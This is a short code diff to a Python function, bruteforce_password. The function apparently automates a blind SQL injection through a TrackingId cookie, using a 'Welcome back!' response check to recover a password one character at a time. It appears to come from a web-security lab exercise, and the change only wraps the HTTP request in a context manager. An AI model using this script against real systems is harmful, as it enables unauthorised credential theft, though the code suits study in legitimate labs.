@@ -36,14 +36,13 @@ def bruteforce_password(candidates):
             cookies = {"session": "whatever",  # no valid session needed
                        "TrackingId": payload, }
 
-            res = requests.get(url, cookies=cookies, timeout=5)
-
-            if "Welcome back!" in res.text:
-                password += candidate
-                print(password)
-                break
-            else:
-                print(".", end="")
+            with requests.get(url, cookies=cookies, timeout=5) as res:
+                if "Welcome back!" in res.text:
+                    password += candidate
+                    print(password)
+                    break
+                else:
+                    print(".", end="")
         else:
             print(f" tried all candidates for position {pos}, complete password:", password)
             break
